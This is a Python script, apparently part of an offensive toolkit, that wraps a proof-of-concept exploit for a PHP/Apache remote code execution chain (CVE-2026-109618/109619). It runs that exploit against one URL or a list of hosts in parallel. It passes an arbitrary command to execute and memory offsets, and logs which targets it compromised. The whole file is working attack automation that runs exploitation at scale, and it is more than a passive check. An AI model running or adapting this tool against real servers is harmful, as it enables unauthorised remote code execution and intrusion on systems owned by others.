#!/usr/bin/env python3
"""PHP2Shell FPM/Apache RCE — CVE-2026-109618 / CVE-2026-109619 (Eness PoC).

Wraps xplotas/php2shell/xplota_2/poc_109618.py for use from the Xplota UI.
Targets Apache/mod_php with PHP 8.4.26 (bookworm profile) or lab build.
Accepts full URLs with HTTPS; uses SSL internally.

Usage:
    python3 scanner.py -u http://192.168.1.100 -o results.json
    python3 scanner.py -l hosts.txt -o results.json
"""
from __future__ import annotations

import argparse
import json
import os
import subprocess
import sys
import threading
import time
from pathlib import Path
from typing import Any
from urllib.parse import urlsplit

CVES = "CVE-2026-109618 / CVE-2026-109619"
_HERE = Path(__file__).resolve().parent
_EXPLOIT = _HERE.parents[2] / "xplotas" / "php2shell" / "xplota_2" / "poc_109618.py"

_VULN_EXIT = {0}
_CLEAN_EXIT = {1}
_CRASH_MARKERS = (
    "Traceback (most recent call last)",
    "RuntimeError:",
    "ConnectionRefusedError:",
    "TimeoutError:",
    "ssl.SSLError",
)


def _parse_url(raw: str) -> str:
    raw = raw.strip()
    if "://" not in raw:
        raw = "http://" + raw
    return raw


def _run(target: str, cmd: str, profile: str, timeout: int,
         zif_offset: str, dtor_offset: str) -> dict[str, Any]:
    url = _parse_url(target)
    args = [sys.executable, "-u", str(_EXPLOIT), "-u", url, "--timeout", str(timeout)]
    if cmd:
        args += ["-c", cmd]
    if profile:
        args += ["--profile", profile]
    if zif_offset:
        args += ["--zif-offset", zif_offset]
    if dtor_offset:
        args += ["--dtor-offset", dtor_offset]

    t0 = time.monotonic()
    lines: list[str] = []
    error: str | None = None
    exit_code: int | None = None

    try:
        proc = subprocess.Popen(
            args,
            stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
            cwd=str(_EXPLOIT.parent),
            env={**os.environ, "PYTHONUNBUFFERED": "1"},
            text=True, encoding="utf-8", errors="replace",
        )
        assert proc.stdout
        for line in proc.stdout:
            line = line.rstrip("\r\n")
            if line:
                print(f"[LOG] {line}", flush=True)
                lines.append(line)
        proc.wait(timeout=5)
        exit_code = proc.returncode
    except FileNotFoundError:
        error = f"exploit not found: {_EXPLOIT}"
        exit_code = -2
    except Exception as exc:
        error = str(exc)
        exit_code = -3

    stdout = "\n".join(lines)
    is_crash = exit_code == 1 and any(m in stdout for m in _CRASH_MARKERS)

    if error and exit_code not in (0, 1):
        vuln, verdict, reason = None, "ERROR", error
    elif is_crash:
        vuln, verdict = None, "INCONCLUSIVE"
        reason = next((l.strip() for l in lines if any(m in l for m in _CRASH_MARKERS)),
                      "Exploit crashed before disclosure")
    elif exit_code in _VULN_EXIT:
        vuln, verdict = True, "VULNERABLE"
        reason = next((l.split("]", 1)[-1].strip() for l in reversed(lines) if "[+]" in l),
                      "RCE chain succeeded")
    elif exit_code in _CLEAN_EXIT:
        vuln, verdict, reason = False, "NOT VULNERABLE", "Target appears patched or not reachable"
    else:
        vuln, verdict = None, "INCONCLUSIVE"
        reason = {-1: "Timed out"}.get(exit_code, f"Inconclusive (exit {exit_code})")

    bracket = "VULNERABLE" if vuln is True else ("NOT VULNERABLE" if vuln is False else "INCONCLUSIVE")
    print(f"[{bracket}] {target} - {reason}", flush=True)
    return {"target": target, "url": target, "tested_url": target,
            "vulnerable": vuln, "verdict": verdict, "reason": reason,
            "error": error, "elapsed": round(time.monotonic() - t0, 2),
            "exit_code": exit_code, "log": stdout[-4096:]}


def main() -> None:
    ap = argparse.ArgumentParser()
    g = ap.add_mutually_exclusive_group(required=True)
    g.add_argument("-u", "--url")
    g.add_argument("-l", "--list")
    ap.add_argument("-o", "--output", required=True)
    ap.add_argument("-t", "--threads", type=int, default=1)
    ap.add_argument("--timeout", type=int, default=120)
    ap.add_argument("--no-color", action="store_true")
    ap.add_argument("--verbose", "-v", action="store_true")
    ap.add_argument("--all-results", action="store_true")
    ap.add_argument("--cmd", default="", help="RCE command (empty = default)")
    ap.add_argument("--profile", default="bookworm", choices=["bookworm", "lab"])
    ap.add_argument("--zif-offset", default="")
    ap.add_argument("--dtor-offset", default="")
    args = ap.parse_args()

    targets = ([args.url.strip()] if args.url else
               [l.strip() for l in Path(args.list).read_text().splitlines()
                if l.strip() and not l.startswith("#")])
    if not targets:
        raise SystemExit("No targets")

    results: list[dict] = []
    lock = threading.Lock()

    def process(t: str) -> None:
        r = _run(t, args.cmd, args.profile, args.timeout,
                 args.zif_offset, args.dtor_offset)
        with lock:
            if args.all_results or r["vulnerable"] is not False:
                results.append(r)

    if args.threads <= 1 or len(targets) == 1:
        for t in targets:
            process(t)
    else:
        from concurrent.futures import ThreadPoolExecutor, as_completed
        with ThreadPoolExecutor(max_workers=min(args.threads, 4)) as pool:
            for f in as_completed({pool.submit(process, t): t for t in targets}):
                try:
                    f.result()
                except Exception as e:
                    print(f"[ERROR] {e}", flush=True)

    Path(args.output).write_text(json.dumps(results, indent=2), encoding="utf-8")
    raise SystemExit(1 if any(r["vulnerable"] for r in results) else 0)


if __name__ == "__main__":
    main()
